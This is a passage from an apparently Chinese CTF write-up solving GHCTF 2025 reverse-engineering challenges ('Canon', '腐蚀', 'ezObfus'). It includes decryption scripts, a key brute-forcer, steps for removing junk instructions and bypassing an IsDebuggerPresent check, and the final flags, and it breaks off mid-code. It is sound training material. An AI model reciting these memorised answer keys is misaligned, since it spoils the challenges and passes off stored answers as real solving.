class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 两个数组最后的0x00都当作截止符，让strlen调用的时候正常返回长度。</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[]&#123;<span class="number">0x22</span>, <span class="number">0xC4</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x6D</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x3E</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0x7F</span>, <span class="number">0xFA</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x62</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xC2</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> key[]&#123;<span class="number">0xD4</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF8</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="built_in">RC4</span>(enc, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-5"><a href="#Flag值-5" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;</code></p><h2 id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现是将输入的字符串分成3份，在循环里面互为密钥进行循环加密，并且利用a3数组数据传入调用不同的加密。</p><p>可以看到加密函数里面有多个case，但由于a3数组里面数字是有限的，只出现了13456，2和7加密没有用到，所以不用分析那两个case。</p><p><img src="/2025/03/06/GHCTF2025WP/84.png" alt="alt text"></p><p>case1：凯撒加密</p><p><img src="/2025/03/06/GHCTF2025WP/85.png" alt="alt text"></p><p>case3：栅栏加密</p><p><img src="/2025/03/06/GHCTF2025WP/86.png" alt="alt text"></p><p>case4：字符串位移</p><p><img src="/2025/03/06/GHCTF2025WP/87.png" alt="alt text"></p><p>case5：异或加密 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/88.png" alt="alt text"></p><p>case6：变种RC4 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/89.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/90.png" alt="alt text"></p><p>注意，Base64的表是被换过的，可以查找交叉调用发现，可以直接动调获取到换后的表。</p><p><img src="/2025/03/06/GHCTF2025WP/91.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/92.png" alt="alt text"></p><p>main函数执行加密的双循环中用到的加密方式数值和加密顺序都可以通过模拟循环来得到，然后逆向就是解密调用的函数顺序和密文顺序。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.encode()</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        plaintext.append(((byte - <span class="number">0x39</span>) ^ k) % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replay</span>(<span class="params">violin, bass, mode</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin):</span><br><span class="line">            offset = <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)])</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - offset) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += violin[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">3</span>:</span><br><span class="line">            Ek = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">            Dk = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            yushu = <span class="built_in">len</span>(violin) % Ek</span><br><span class="line">            steps = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(violin) % Ek == <span class="number">0</span>:</span><br><span class="line">                step = Dk</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Ek):</span><br><span class="line">                    steps.append(step)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                big_step = math.ceil(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                small_step = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(yushu):</span><br><span class="line">                    steps.append(big_step)</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(Ek - yushu):</span><br><span class="line">                    steps.append(small_step)</span><br><span class="line"></span><br><span class="line">            n_column = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> n_column &lt; math.ceil(<span class="built_in">len</span>(violin) / Ek):</span><br><span class="line">                count_steps = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> one_step <span class="keyword">in</span> steps:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="built_in">len</span>(violin):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res += violin[n_column + count_steps]</span><br><span class="line">                        count_steps += one_step</span><br><span class="line">                n_column += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">4</span>:</span><br><span class="line">        step = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        res += violin[step:]</span><br><span class="line">        res += violin[:step]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">5</span>:</span><br><span class="line">        violin_decode = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin_decode):</span><br><span class="line">            res += <span class="built_in">chr</span>(char ^ <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)]) + <span class="number">0x39</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">6</span>:</span><br><span class="line">        violin_byte = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = rc4_decrypt(violin_byte, bass)</span><br><span class="line">        <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    violin = [<span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>, <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>, <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>]</span><br><span class="line">    v = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    chord = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        tmp = replay(violin[v[i] - <span class="number">1</span>], violin[v[i] % <span class="number">3</span>], chord[i])</span><br><span class="line">        violin[v[i] - <span class="number">1</span>] = tmp</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(violin))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Flag值-6"><a href="#Flag值-6" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;P4ch3Lbel&#39;s_C@n0n_1n_D_mAjOr&#125;</code></p><h2 id="腐蚀"><a href="#腐蚀" class="headerlink" title="腐蚀"></a>腐蚀</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>IDA分析main函数，发现开头程序要读入一个Input.png文件。</p><p><img src="/2025/03/06/GHCTF2025WP/56.png" alt="alt text"></p><p>并且在程序尾部将加密后的数据写到enc文件，输出完成语句。</p><p><img src="/2025/03/06/GHCTF2025WP/57.png" alt="alt text"></p><p>进入这个函数。</p><p><img src="/2025/03/06/GHCTF2025WP/58.png" alt="alt text"></p><p>发现这个函数是一个RC4加密流程，通过0x100特征和一些异或计算可以看出来的。</p><p>并且是变种RC4，最后异或加密的时候多异或上了0x1f。</p><p><img src="/2025/03/06/GHCTF2025WP/59.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/60.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/61.png" alt="alt text"></p><p>我们创建一个Input.png文件，动调程序运行到这个函数断住，a2可以在第二个while循环中看出来，是充当RC4密钥。</p><p>跳到a2地址，发现是一个这样的结构，数据长度+数据指针，数据指针跳过去，这十六个字节就是密钥，发现一些特征，看起来像是PNG文件的开头部分字节和结尾部分字节乱序混在一起，不过不重要，只要动调拿到16字节的key即可。<br>密钥：<code>60 82 AE 42 4E 44 49 45 1A 0A 0D 0A 4E 47 89 50</code></p><p><img src="/2025/03/06/GHCTF2025WP/62.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/63.png" alt="alt text"></p><p>而a3是即将被加密的明文数据，跳过去发现也是同样结构，发现大小是0x30B，和我给的Input.png文件字节数一样，跳过去就会发现就是读入的png文件字节。</p><p><img src="/2025/03/06/GHCTF2025WP/64.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/65.png" alt="alt text"></p><p>从函数尾部的赋值可以看出a1就是加密后数据储存的地方，将该函数执行完返回到main函数，然后跳到a1地址将数据复制出来尝试RC4+Xor解密，发现确实可以解密出原字节，</p><p><img src="/2025/03/06/GHCTF2025WP/66.png" alt="alt text"></p><p>直接执行到write_all即将写出到enc文件处，然后查看v18，v18是通过上面RC4加密返回的v44得到的。</p><p><img src="/2025/03/06/GHCTF2025WP/67.png" alt="alt text"></p><p>发现对比原RC4加密返回的数据，写出的数据做了字节顺序翻转处理。</p><p><img src="/2025/03/06/GHCTF2025WP/68.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/69.png" alt="alt text"></p><p>直接让程序跑起来，写出enc文件，拖入到010Editor中，发现确实是将RC4加密后的数据翻转后再写到的文件。</p><p><img src="/2025/03/06/GHCTF2025WP/70.png" alt="alt text"></p><p>所以解密流程为：读入题目enc附件-&gt;翻转字节-&gt;RC4解密</p><p>Cyberchef：</p><p><img src="/2025/03/06/GHCTF2025WP/71.png" alt="alt text"></p><p>导出图片得到Flag</p><p><img src="/2025/03/06/GHCTF2025WP/72.png" alt="alt text"></p><h3 id="Flag值-7"><a href="#Flag值-7" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Y0u_ar3_ru5t_m@st3r&#125;</code></p><h2 id="ezObfus"><a href="#ezObfus" class="headerlink" title="ezObfus"></a>ezObfus</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>IDA分析程序，发现存在花指令，大部分花指令就以下几种情况，第一种截图区域所有字节都nop，后面几种就跳转地址汇编按u进行undefine，然后再跳过对应字节按c还原汇编代码。</p><p><img src="/2025/03/06/GHCTF2025WP/73.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/74.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/75.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/76.png" alt="alt text"></p><p>去掉main函数几个花指令后按p还原函数进行反编译，发现存在代码混淆，且开头有反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/77.png" alt="alt text"></p><p>直接条件断点在IsDebuggerPresent，将返回值eax设置为0即可跳过反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/78.png" alt="alt text"></p><p>发现代码中有用到一些常数，跳转过来发现是0-9，手动将名字都命名为对应数字，方便分析代码。</p><p><img src="/2025/03/06/GHCTF2025WP/79.png" alt="alt text"></p><p>上图发现for循环最后i是+&#x3D;了一个函数传进去1的返回值，去掉该函数花指令后，可以发现是以下代码，返回的永远是传参的值，也就是1，所以其实这个函数没什么用，直接看参数值就是对应值。</p><p><img src="/2025/03/06/GHCTF2025WP/80.png" alt="alt text"></p><p>然后配合动调，省略去混淆部分代码，抽离出主要核心代码，且所有常量字符串都被加密过的，只能动调获取。</p><p>第一部分key校验代码如下。</p><p><img src="/2025/03/06/GHCTF2025WP/81.png" alt="alt text"></p><p>同理第二部分的Flag校验如下，byte_F1A004就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/82.png" alt="alt text"></p><p>去掉加密函数的花指令，然后同样进行动调抽离关键代码。</p><p><img src="/2025/03/06/GHCTF2025WP/83.png" alt="alt text"></p><p>还原出程序完整原始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> InputLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)Input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; InputLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = i ^ (Key &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span>));</span><br><span class="line">        <span class="type">uint8_t</span> v27 = v26 ^ Input[i];</span><br><span class="line">        <span class="type">uint8_t</span> v28 = (v27 &gt;&gt; <span class="number">5</span>) | (v27 * <span class="number">8</span>);</span><br><span class="line">        v28 += i;</span><br><span class="line">        Input[i] = v28;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> Input[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v66 != <span class="number">1172912374</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Input); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Input[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Encrypt</span>(Input, Key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过爆破得到目标Key</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; Key &lt; <span class="number">0xffffffff</span>; Key++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">            <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">            <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">                v67 = v66 ^ v71;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">            v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">            v66 = v67 - v71;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v66 == <span class="number">1172912374</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>, Key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破得到Key：<code>8C90F77B</code></p><p>然后通过加密函数编写解密函数解密byte_F1A004数组即可得到Flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x6E</span>, <span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x4C</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0xED</span>, <span class="number">0xD2</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x39</span>, <span class="number">0xB5</span>, <span class="number">0x49</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xA9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 